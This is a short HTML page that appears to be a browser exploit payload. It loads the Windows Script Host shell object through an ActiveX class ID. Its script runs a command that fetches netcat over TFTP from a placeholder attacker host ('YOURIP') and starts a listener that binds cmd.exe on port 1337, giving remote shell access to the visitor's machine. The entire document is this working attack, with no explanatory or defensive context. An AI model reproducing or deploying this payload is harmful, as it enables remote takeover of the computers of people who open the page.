<html>
<object id='wsh' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>
<script>
wsh.Run("cmD.exe /k tftp.exe -i YOURIP GET nc.exe c:\nc.exe nc.exe -d -L -p 1337 -e cmd.exe");
</script>
</html> 